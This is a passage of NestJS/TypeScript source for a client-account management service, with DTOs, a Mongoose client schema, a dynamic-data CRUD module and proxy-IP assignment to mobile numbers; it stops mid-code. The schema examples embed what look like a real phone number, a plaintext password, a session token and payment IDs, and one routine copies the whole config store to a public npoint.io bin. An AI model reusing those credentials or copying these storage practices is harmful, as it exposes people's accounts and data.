'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    readonly deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    readonly mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    readonly product: string;\n\n    @ApiProperty({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user', required: false })\n    readonly qrId: string;\n\n    @ApiProperty({ example: 'myred1808@postbank', description: 'Google Pay ID of the user', required: false })\n    readonly gpayId: string;\n\n    @ApiProperty({ example: ['192.168.1.100:8080', '192.168.1.101:8080'], description: 'Dedicated proxy IPs assigned to this client', required: false })\n    readonly dedicatedIps?: string[];\n\n    @ApiProperty({ example: 'US', description: 'Preferred country for IP assignment', required: false })\n    readonly preferredIpCountry?: string;\n\n    @ApiProperty({ example: true, description: 'Whether to auto-assign IPs to mobile numbers', required: false })\n    readonly autoAssignIps?: boolean;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\nimport { IsOptional, IsString, IsArray, IsUrl, Matches, ArrayNotEmpty } from 'class-validator';\n\nexport class SearchClientDto {\n    @ApiPropertyOptional({ description: 'Client ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    @Matches(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' })\n    clientId?: string;\n\n    @ApiPropertyOptional({ description: 'Database collection name' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    dbcoll?: string;\n\n    @ApiPropertyOptional({ description: 'Channel link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    channelLink?: string;\n\n    @ApiPropertyOptional({ description: 'Link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    link?: string;\n\n    @ApiPropertyOptional({ description: 'Name of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    name?: string;\n\n    @ApiPropertyOptional({ description: 'Phone number of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @Matches(/^\\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' })\n    number?: string;\n\n    @ApiPropertyOptional({ description: 'Password of the client' })\n    @IsOptional()\n    @IsString()\n    password?: string;\n\n    @ApiPropertyOptional({ description: 'Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    repl?: string;\n\n    @ApiPropertyOptional({ description: 'Promotion Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    promoteRepl?: string;\n\n    @ApiPropertyOptional({ description: 'Clientname of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    clientName?: string;\n\n    @ApiPropertyOptional({ description: 'Deployment key URL' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    deployKey?: string;\n\n    @ApiPropertyOptional({ description: 'Main account of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    mainAccount?: string;\n\n    @ApiPropertyOptional({ description: 'Product associated with the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    product?: string;\n\n    @ApiPropertyOptional({ description: 'Search by client ID that has promote mobiles assigned' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    @Matches(/^(true|false)$/i, { message: 'hasPromoteMobiles must be either \"true\" or \"false\"' })\n    hasPromoteMobiles?: string;\n\n    @ApiPropertyOptional({ description: 'Paytm QR ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    qrId?: string;\n\n    @ApiPropertyOptional({ description: 'Google Pay ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    gpayId?: string;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateClientDto } from './create-client.dto';\n\nexport class UpdateClientDto extends PartialType(CreateClientDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type ClientDocument = Client & Document;\n\n@Schema({\n    collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Client {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    @Prop({ required: true })\n    channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    @Prop({ required: true })\n    dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    @Prop({ required: true })\n    link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    @Prop({ required: true })\n    name: string;\n\n    @ApiProperty({ example: '916265240911', description: 'mobile number of the user' })\n    @Prop({ required: true })\n    mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    @Prop({ required: true })\n    password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    @Prop({ required: true })\n    repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    @Prop({ required: true })\n    promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuM==', description: 'Session token' })\n    @Prop({ required: true })\n    session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    @Prop({ required: true })\n    username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    @Prop({ required: true })\n    clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    @Prop({ required: true })\n    deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    @Prop({ required: true })\n    mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    @Prop({ required: true })\n    product: string;\n\n    @ApiProperty({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user' })\n    @Prop({ required: true })\n    qrId: string;\n\n    @ApiProperty({ example: 'myred1808@postbank', description: 'Google Pay ID of the user' })\n    @Prop({ required: true })\n    gpayId: string;\n\n    @ApiProperty({ example: ['192.168.1.100:8080', '192.168.1.101:8080'], description: 'Dedicated proxy IPs assigned to this client' })\n    @Prop({ required: false, type: [String], default: [] })\n    dedicatedIps?: string[];\n}\n\nexport const ClientSchema = SchemaFactory.createForClass(Client);\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsNotEmpty, IsString } from 'class-validator';\r\n\r\nexport class CreateDynamicDataDto {\r\n  @ApiProperty({\r\n    description: 'Unique identifier for the dynamic data',\r\n    example: 'user123',\r\n  })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  readonly configKey: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Dynamic JSON data',\r\n    example: {\r\n      profile: {\r\n        name: 'John Doe',\r\n        age: 30,\r\n      },\r\n      preferences: {\r\n        theme: 'dark',\r\n        notifications: true,\r\n      },\r\n    },\r\n  })\r\n  @IsNotEmpty()\r\n  readonly data: any;\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsOptional, IsString, Matches } from 'class-validator';\r\n\r\nexport class GetDynamicDataDto {\r\n  @ApiProperty({\r\n    description: 'Path to retrieve specific data using dot notation',\r\n    example: 'profile.name',\r\n    required: false,\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Matches(/^[a-zA-Z0-9]+([\\._][a-zA-Z0-9]+)*$/, {\r\n    message: 'Invalid path format. Use dot notation (e.g., profile.name)',\r\n  })\r\n  readonly path?: string;\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsEnum, IsNotEmpty, IsOptional, IsString, Matches } from 'class-validator';\r\n\r\nexport enum ArrayOperationType {\r\n    PUSH = 'PUSH',\r\n    POP = 'POP',\r\n    INSERT = 'INSERT',\r\n    REMOVE = 'REMOVE',\r\n    UPDATE = 'UPDATE',\r\n}\r\n\r\nexport class ArrayOperation {\r\n    @ApiProperty({\r\n        enum: ArrayOperationType,\r\n        description: 'Type of array operation to perform',\r\n    })\r\n    @IsEnum(ArrayOperationType)\r\n    type: ArrayOperationType;\r\n\r\n    @ApiProperty({\r\n        description: 'Index for array operations (required for INSERT and UPDATE)',\r\n        required: false,\r\n    })\r\n    @IsOptional()\r\n    index?: number;\r\n}\r\n\r\nexport class UpdateDynamicDataDto {\r\n    @ApiProperty({\r\n        description: 'Path to the field to update using dot notation. If not provided, updates entire data object.',\r\n        example: 'profile.age',\r\n        required: false,\r\n    })\r\n    @IsOptional()\r\n    @IsString()\r\n    @Matches(/^[a-zA-Z0-9]+([\\._][a-zA-Z0-9]+)*$/, {\r\n        message: 'Invalid path format. Use dot notation (e.g., profile.age)',\r\n    })\r\n    readonly path?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'New value for the field or entire data object if path is not provided',\r\n        example: { profile: { age: 31 } },\r\n    })\r\n    @IsNotEmpty()\r\n    readonly value: any;\r\n\r\n    @ApiProperty({\r\n        description: 'Array operation configuration',\r\n        required: false,\r\n        type: ArrayOperation,\r\n    })\r\n    @IsOptional()\r\n    readonly arrayOperation?: ArrayOperation;\r\n}\r\n","import {\r\n  Controller,\r\n  Get,\r\n  Post,\r\n  Body,\r\n  Patch,\r\n  Param,\r\n  Delete,\r\n  Query,\r\n  HttpCode,\r\n  HttpStatus,\r\n} from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiParam, ApiQuery } from '@nestjs/swagger';\r\nimport { DynamicDataService } from './dynamic-data.service';\r\nimport { CreateDynamicDataDto } from './dto/create-dynamic-data.dto';\r\nimport { UpdateDynamicDataDto } from './dto/update-dynamic-data.dto';\r\nimport { GetDynamicDataDto } from './dto/get-dynamic-data.dto';\r\n\r\n@ApiTags('dynamic-data')\r\n@Controller('dynamic-data')\r\nexport class DynamicDataController {\r\n  constructor(private readonly dynamicDataService: DynamicDataService) {}\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new dynamic data document' })\r\n  @ApiResponse({\r\n    status: 201,\r\n    description: 'The dynamic data document has been successfully created.',\r\n  })\r\n  @ApiResponse({ status: 400, description: 'Bad Request' })\r\n  @ApiResponse({ status: 409, description: 'Conflict - Document already exists' })\r\n  async create(@Body() createDynamicDataDto: CreateDynamicDataDto) {\r\n    return this.dynamicDataService.create(createDynamicDataDto);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all dynamic data documents' })\r\n  @ApiResponse({\r\n    status: 200,\r\n    description: 'Returns all dynamic data documents as a key-value object',\r\n  })\r\n  async findAll() {\r\n    return this.dynamicDataService.findAll();\r\n  }\r\n\r\n  @Post('check-npoint')\r\n  @HttpCode(HttpStatus.OK)\r\n  @ApiOperation({ summary: 'Check and update npoint data if needed' })\r\n  @ApiResponse({ status: 200, description: 'Npoint data check completed successfully' })\r\n  async checkNpoint() {\r\n    await this.dynamicDataService.checkNpoint();\r\n    return { message: 'Npoint check completed' };\r\n  }\r\n\r\n  @Get(':configKey')\r\n  @ApiOperation({ summary: 'Get dynamic data by configKey' })\r\n  @ApiParam({ name: 'configKey', description: 'Unique identifier for the document' })\r\n  @ApiQuery({\r\n    name: 'path',\r\n    required: false,\r\n    description: 'Optional path to retrieve specific nested data',\r\n  })\r\n  @ApiResponse({ status: 200, description: 'Returns the requested dynamic data' })\r\n  @ApiResponse({ status: 404, description: 'Document or path not found' })\r\n  async findOne(\r\n    @Param('configKey') configKey: string,\r\n    @Query() { path }: GetDynamicDataDto,\r\n  ) {\r\n    return this.dynamicDataService.findOne(configKey, path);\r\n  }\r\n\r\n  @Patch(':configKey')\r\n  @ApiOperation({ summary: 'Update dynamic data by configKey' })\r\n  @ApiParam({ name: 'configKey', description: 'Unique identifier for the document' })\r\n  @ApiResponse({ status: 200, description: 'The dynamic data has been successfully updated' })\r\n  @ApiResponse({ status: 400, description: 'Bad Request' })\r\n  @ApiResponse({ status: 404, description: 'Document not found' })\r\n  async update(\r\n    @Param('configKey') configKey: string,\r\n    @Body() updateDynamicDataDto: UpdateDynamicDataDto,\r\n  ) {\r\n    return this.dynamicDataService.update(configKey, updateDynamicDataDto);\r\n  }\r\n\r\n  @Delete(':configKey')\r\n  @HttpCode(HttpStatus.NO_CONTENT)\r\n  @ApiOperation({ summary: 'Delete dynamic data by configKey' })\r\n  @ApiParam({ name: 'configKey', description: 'Unique identifier for the document' })\r\n  @ApiQuery({\r\n    name: 'path',\r\n    required: false,\r\n    description: 'Optional path to delete specific nested data',\r\n  })\r\n  @ApiResponse({ status: 204, description: 'The dynamic data has been successfully deleted' })\r\n  @ApiResponse({ status: 404, description: 'Document or path not found' })\r\n  async remove(\r\n    @Param('configKey') configKey: string,\r\n    @Query() { path }: GetDynamicDataDto,\r\n  ) {\r\n    await this.dynamicDataService.remove(configKey, path);\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { DynamicDataController } from './dynamic-data.controller';\r\nimport { DynamicDataService } from './dynamic-data.service';\r\nimport { DynamicData, DynamicDataSchema } from './dynamic-data.schema';\r\nimport { NpointModule } from '../n-point';\r\n\r\n@Module({\r\n  imports: [\r\n    MongooseModule.forFeature([\r\n      { name: DynamicData.name, schema: DynamicDataSchema },\r\n    ]),\r\n    NpointModule,\r\n  ],\r\n  controllers: [DynamicDataController],\r\n  providers: [DynamicDataService],\r\n  exports: [DynamicDataService],\r\n})\r\nexport class DynamicDataModule {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document, Schema as MongooseSchema } from 'mongoose';\r\n\r\nexport type DynamicDataDocument = DynamicData & Document;\r\n\r\n@Schema({\r\n  collection: 'dynamic_data',\r\n  versionKey: false,\r\n  timestamps: true,\r\n  strict: false,\r\n  toJSON: {\r\n    transform: (_, ret) => {\r\n      delete ret._id;\r\n      return ret;\r\n    },\r\n  },\r\n})\r\nexport class DynamicData {\r\n  @Prop({ required: true, unique: true, type: String })\r\n  configKey: string;\r\n\r\n  @Prop({ type: MongooseSchema.Types.Mixed, required: true })\r\n  data: any;\r\n}\r\n\r\nexport const DynamicDataSchema = SchemaFactory.createForClass(DynamicData);\r\n","import { Injectable, NotFoundException, BadRequestException, ConflictException, Logger } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model, ClientSession } from 'mongoose';\r\nimport { DynamicData, DynamicDataDocument } from './dynamic-data.schema';\r\nimport { CreateDynamicDataDto } from './dto/create-dynamic-data.dto';\r\nimport { UpdateDynamicDataDto, ArrayOperationType } from './dto/update-dynamic-data.dto';\r\nimport { get, set, unset, has } from 'lodash';\r\nimport { InjectConnection } from '@nestjs/mongoose';\r\nimport * as mongoose from 'mongoose';\r\nimport { parseError } from '../../utils';\r\nimport axios from 'axios';\r\nimport { areJsonsNotSame } from '../../utils/common';\r\nimport { NpointService } from '../n-point/npoint.service';\r\n\r\n@Injectable()\r\nexport class DynamicDataService {\r\n    private readonly logger = new Logger(DynamicDataService.name);\r\n\r\n    constructor(\r\n        @InjectModel(DynamicData.name)\r\n        private dynamicDataModel: Model<DynamicDataDocument>,\r\n        @InjectConnection() private readonly connection: mongoose.Connection,\r\n        private readonly npointService: NpointService,\r\n    ) {}\r\n\r\n    async create(createDto: CreateDynamicDataDto): Promise<DynamicData> {\r\n        this.logger.debug(`Creating dynamic data with configKey: ${createDto.configKey}`);\r\n        const session = await this.connection.startSession();\r\n        try {\r\n            await session.startTransaction();\r\n            this.logger.debug('Started transaction for create operation');\r\n\r\n            const exists = await this.dynamicDataModel.findOne({ configKey: createDto.configKey }).session(session);\r\n            if (exists) {\r\n                this.logger.warn(`Attempted to create duplicate configKey: ${createDto.configKey}`);\r\n                throw new ConflictException(`Document with configKey ${createDto.configKey} already exists`);\r\n            }\r\n\r\n            const created = new this.dynamicDataModel(createDto);\r\n            await created.save({ session });\r\n            this.logger.debug(`Successfully created dynamic data for configKey: ${createDto.configKey}`);\r\n\r\n            await session.commitTransaction();\r\n            this.logger.debug('Transaction committed successfully');\r\n            return created.toJSON().data;\r\n        } catch (error) {\r\n            await session.abortTransaction();\r\n            parseError(error, 'Failed to create dynamic data: ', true);\r\n            this.logger.error(`Failed to create dynamic data: ${error.message}`, error.stack);\r\n            if (error instanceof ConflictException) {\r\n                throw error;\r\n            }\r\n            throw new BadRequestException('Failed to create dynamic data');\r\n        } finally {\r\n            await session.endSession();\r\n        }\r\n    }\r\n\r\n    async findOne(configKey: string, path?: string): Promise<any> {\r\n        this.logger.debug(`Finding dynamic data with configKey: ${configKey}${path ? `, path: ${path}` : ''}`);\r\n        const doc = await this.dynamicDataModel.findOne({ configKey });\r\n        if (!doc) {\r\n            this.logger.warn(`Document not found with configKey: ${configKey}`);\r\n            throw new NotFoundException(`Document with configKey ${configKey} not found`);\r\n        }\r\n\r\n        if (path) {\r\n            if (!has(doc.data, path)) {\r\n                this.logger.warn(`Path ${path} not found in document with configKey: ${configKey}`);\r\n                throw new NotFoundException(`Path ${path} not found in document`);\r\n            }\r\n            this.logger.debug(`Successfully retrieved data at path: ${path}`);\r\n            return get(doc.data, path);\r\n        }\r\n\r\n        this.logger.debug(`Successfully retrieved full document for configKey: ${configKey}`);\r\n        return doc.toJSON().data;\r\n    }\r\n\r\n    async update(\r\n        configKey: string,\r\n        updateDto: UpdateDynamicDataDto,\r\n        session?: ClientSession,\r\n    ): Promise<DynamicData> {\r\n        this.logger.debug(`Updating dynamic data for configKey: ${configKey}`);\r\n        const useSession = session || await this.connection.startSession();\r\n        let shouldEndSession = false;\r\n\r\n        try {\r\n            if (!session) {\r\n                shouldEndSession = true;\r\n                await useSession.startTransaction();\r\n                this.logger.debug('Started new transaction for update operation');\r\n            }\r\n\r\n            const doc = await this.dynamicDataModel.findOne({ configKey }).session(useSession);\r\n            if (!doc) {\r\n                this.logger.warn(`Document not found with configKey: ${configKey}`);\r\n                throw new NotFoundException(`Document with configKey ${configKey} not found`);\r\n            }\r\n\r\n            if (updateDto.arrayOperation) {\r\n                if (!updateDto.path) {\r\n                    this.logger.error('Attempted array operation without specifying path');\r\n                    throw new BadRequestException('Path is required for array operations');\r\n                }\r\n                this.logger.debug(`Performing array operation: ${updateDto.arrayOperation.type} on path: ${updateDto.path}`);\r\n                await this.handleArrayOperation(doc, updateDto, useSession);\r\n            } else if (updateDto.path) {\r\n                if (!has(doc.data, updateDto.path)) {\r\n                    this.logger.warn(`Path ${updateDto.path} not found in document with configKey: ${configKey}`);\r\n                    throw new NotFoundException(`Path ${updateDto.path} not found in document`);\r\n                }\r\n                this.logger.debug(`Updating value at path: ${updateDto.path}`);\r\n                set(doc.data, updateDto.path, updateDto.value);\r\n            } else {\r\n                this.logger.debug('Performing full data update');\r\n                doc.data = updateDto.value;\r\n            }\r\n\r\n            await doc.save({ session: useSession });\r\n            this.logger.debug(`Successfully updated document with configKey: ${configKey}`);\r\n\r\n            if (shouldEndSession) {\r\n                await useSession.commitTransaction();\r\n                this.logger.debug('Transaction committed successfully');\r\n            }\r\n\r\n            return doc.toJSON();\r\n        } catch (error) {\r\n            if (shouldEndSession) {\r\n                await useSession.abortTransaction();\r\n                this.logger.error('Transaction aborted due to error');\r\n            }\r\n            parseError(error, 'Failed to update dynamic data: ', true);\r\n            this.logger.error(`Failed to update dynamic data: ${error.message}`, error.stack);\r\n            throw error;\r\n        } finally {\r\n            if (shouldEndSession) {\r\n                await useSession.endSession();\r\n            }\r\n        }\r\n    }\r\n\r\n    private async handleArrayOperation(\r\n        doc: DynamicDataDocument,\r\n        updateDto: UpdateDynamicDataDto,\r\n        session: ClientSession,\r\n    ): Promise<void> {\r\n        this.logger.debug(`Handling array operation: ${updateDto.arrayOperation.type} at path: ${updateDto.path}`);\r\n        const array = get(doc.data, updateDto.path);\r\n        if (!Array.isArray(array)) {\r\n            this.logger.error(`Path ${updateDto.path} is not an array`);\r\n            throw new BadRequestException(`Path ${updateDto.path} is not an array`);\r\n        }\r\n\r\n        const { type, index } = updateDto.arrayOperation;\r\n        try {\r\n            switch (type) {\r\n                case ArrayOperationType.PUSH:\r\n                    this.logger.debug(`Pushing new value to array at path: ${updateDto.path}`);\r\n                    array.push(updateDto.value);\r\n                    break;\r\n                case ArrayOperationType.POP:\r\n                    this.logger.debug(`Popping value from array at path: ${updateDto.path}`);\r\n                    array.pop();\r\n                    break;\r\n                case ArrayOperationType.INSERT:\r\n                    if (index === undefined || index < 0 || index > array.length) {\r\n                        this.logger.error(`Invalid index ${index} for INSERT operation`);\r\n                        throw new BadRequestException('Invalid array index for INSERT operation');\r\n                    }\r\n                    this.logger.debug(`Inserting value at index ${index} in array at path: ${updateDto.path}`);\r\n                    array.splice(index, 0, updateDto.value);\r\n                    break;\r\n                case ArrayOperationType.REMOVE:\r\n                    if (index === undefined || index < 0 || index >= array.length) {\r\n                        this.logger.error(`Invalid index ${index} for REMOVE operation`);\r\n                        throw new BadRequestException('Invalid array index for REMOVE operation');\r\n                    }\r\n                    this.logger.debug(`Removing value at index ${index} from array at path: ${updateDto.path}`);\r\n                    array.splice(index, 1);\r\n                    break;\r\n                case ArrayOperationType.UPDATE:\r\n                    if (index === undefined || index < 0 || index >= array.length) {\r\n                        this.logger.error(`Invalid index ${index} for UPDATE operation`);\r\n                        throw new BadRequestException('Invalid array index for UPDATE operation');\r\n                    }\r\n                    this.logger.debug(`Updating value at index ${index} in array at path: ${updateDto.path}`);\r\n                    array[index] = updateDto.value;\r\n                    break;\r\n                default:\r\n                    this.logger.error(`Invalid array operation type: ${type}`);\r\n                    throw new BadRequestException('Invalid array operation type');\r\n            }\r\n\r\n            set(doc.data, updateDto.path, array);\r\n            await doc.save({ session });\r\n            this.logger.debug('Array operation completed successfully');\r\n        } catch (error) {\r\n            this.logger.error(`Array operation failed: ${error.message}`, error.stack);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    async remove(configKey: string, path?: string): Promise<void> {\r\n        this.logger.debug(`Removing dynamic data for configKey: ${configKey}${path ? `, path: ${path}` : ''}`);\r\n        const session = await this.connection.startSession();\r\n        try {\r\n            await session.startTransaction();\r\n            this.logger.debug('Started transaction for remove operation');\r\n\r\n            const doc = await this.dynamicDataModel.findOne({ configKey }).session(session);\r\n            if (!doc) {\r\n                this.logger.warn(`Document not found with configKey: ${configKey}`);\r\n                throw new NotFoundException(`Document with configKey ${configKey} not found`);\r\n            }\r\n\r\n            if (path) {\r\n                if (!has(doc.data, path)) {\r\n                    this.logger.warn(`Path ${path} not found in document with configKey: ${configKey}`);\r\n                    throw new NotFoundException(`Path ${path} not found in document`);\r\n                }\r\n                this.logger.debug(`Removing data at path: ${path}`);\r\n                unset(doc.data, path);\r\n                await doc.save({ session });\r\n            } else {\r\n                this.logger.debug(`Deleting entire document with configKey: ${configKey}`);\r\n                await this.dynamicDataModel.deleteOne({ configKey }).session(session);\r\n            }\r\n\r\n            await session.commitTransaction();\r\n            this.logger.debug('Transaction committed successfully');\r\n        } catch (error) {\r\n            await session.abortTransaction();\r\n            parseError(error, 'Failed to remove dynamic data: ', true);\r\n            this.logger.error(`Failed to remove dynamic data: ${error.message}`, error.stack);\r\n            throw error;\r\n        } finally {\r\n            await session.endSession();\r\n        }\r\n    }\r\n\r\n    async findAll(): Promise<Record<string, any>> {\r\n        this.logger.debug('Retrieving all dynamic data documents');\r\n        try {\r\n            const documents = await this.dynamicDataModel.find().exec();\r\n            const result = documents.reduce((acc, doc) => {\r\n                acc[doc.configKey] = doc.toJSON().data;\r\n                return acc;\r\n            }, {} as Record<string, any>);\r\n\r\n            this.logger.debug(`Successfully retrieved ${documents.length} dynamic data documents`);\r\n            return result;\r\n        } catch (error) {\r\n            parseError(error, 'Failed to retrieve all dynamic data: ', true);\r\n            this.logger.error(`Failed to retrieve all dynamic data: ${error.message}`, error.stack);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    async checkNpoint(): Promise<void> {\r\n        this.logger.debug('Checking npoint data for updates');\r\n        try {\r\n            const response = await axios.get('https://api.npoint.io/6841a4c0c23bdc78333d');\r\n            const npointData = response.data;\r\n            this.logger.debug('Fetched npoint data successfully');\r\n            const existingData = await this.findAll();\r\n            if (areJsonsNotSame(existingData, npointData)) {\r\n                await this.npointService.updateDocument('6841a4c0c23bdc78333d', existingData);\r\n                this.logger.debug('Npoint data updated successfully');\r\n            } else {\r\n                this.logger.debug('No updates needed for npoint data');\r\n            }\r\n        } catch (error) {\r\n            this.logger.error(`Failed to check/update npoint data: ${error.message}`, error.stack);\r\n            parseError(error, 'Failed to check/update npoint data: ', true);\r\n            throw error;\r\n        }\r\n    }\r\n}\r\n","import { Controller, Get, Post, Delete, Body, Param, Query, HttpException, HttpStatus } from '@nestjs/common';\r\nimport {\r\n    ApiTags,\r\n    ApiOperation,\r\n    ApiResponse,\r\n    ApiParam,\r\n    ApiBody,\r\n    ApiQuery\r\n} from '@nestjs/swagger';\r\nimport { ClientIpIntegrationService } from './client-ip-integration.service';\r\n\r\n@ApiTags('Client IP Integration')\r\n@Controller('client-ip-integration')\r\nexport class ClientIpIntegrationController {\r\n    constructor(private readonly clientIpIntegrationService: ClientIpIntegrationService) {}\r\n\r\n    @Post('clients/:clientId/auto-assign-ips')\r\n    @ApiOperation({ summary: 'Auto-assign IPs to all client mobile numbers' })\r\n    @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n    @ApiResponse({ status: 200, description: 'IPs assigned successfully' })\r\n    async autoAssignIpsToClient(@Param('clientId') clientId: string): Promise<any> {\r\n        try {\r\n            return await this.clientIpIntegrationService.autoAssignIpsToClient(clientId);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Get('mobile/:mobile/ip')\r\n    @ApiOperation({ summary: 'Get IP assigned to a mobile number with smart assignment' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number' })\r\n    @ApiQuery({ name: 'clientId', description: 'Optional client ID for context', required: false })\r\n    @ApiQuery({ name: 'autoAssign', description: 'Auto-assign IP if not found and context available', required: false })\r\n    @ApiResponse({ status: 200, description: 'IP address retrieved or assigned' })\r\n    async getIpForMobile(\r\n        @Param('mobile') mobile: string,\r\n        @Query('clientId') clientId?: string,\r\n        @Query('autoAssign') autoAssign?: string\r\n    ): Promise<{ mobile: string; ipAddress: string | null; source: string }> {\r\n        try {\r\n            const shouldAutoAssign = autoAssign === 'true' || autoAssign === '1';\r\n            const ipAddress = await this.clientIpIntegrationService.getIpForMobile(\r\n                mobile, \r\n                clientId, \r\n                shouldAutoAssign\r\n            );\r\n            const source = ipAddress ? (shouldAutoAssign ? 'auto_assigned' : 'existing_mapping') : 'not_found';\r\n            return { mobile, ipAddress, source };\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Get('clients/:clientId/ip-summary')\r\n    @ApiOperation({ summary: 'Get comprehensive IP information for a client' })\r\n    @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n    @ApiResponse({ status: 200, description: 'Client IP summary retrieved successfully' })\r\n    async getClientIpSummary(@Param('clientId') clientId: string): Promise<any> {\r\n        try {\r\n            return await this.clientIpIntegrationService.getClientIpSummary(clientId);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Post('clients/:clientId/auto-assign-all-ips')\r\n    @ApiOperation({ summary: 'Auto-assign IPs to all client mobile numbers (alternative endpoint)' })\r\n    @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n    @ApiResponse({ status: 200, description: 'IPs auto-assigned using ClientService' })\r\n    async autoAssignAllIpsViaClientService(@Param('clientId') clientId: string): Promise<any> {\r\n        try {\r\n            // Use ClientService's autoAssignIpsToClient method as an alternative\r\n            return await this.clientIpIntegrationService.autoAssignIpsToClient(clientId);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Post('clients/:clientId/assign-main-mobile-ip')\r\n    @ApiOperation({ summary: 'Assign IP to client main mobile number' })\r\n    @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n    @ApiBody({\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                mobile: { type: 'string', description: 'Mobile number' },\r\n                preferredCountry: { type: 'string', description: 'Preferred country code' }\r\n            },\r\n            required: ['mobile']\r\n        }\r\n    })\r\n    @ApiResponse({ status: 200, description: 'IP assigned to main mobile' })\r\n    async assignIpToMainMobile(\r\n        @Param('clientId') clientId: string,\r\n        @Body() body: { mobile: string; preferredCountry?: string }\r\n    ): Promise<any> {\r\n        try {\r\n            return await this.clientIpIntegrationService.assignIpToMainMobile(\r\n                clientId,\r\n                body.mobile,\r\n                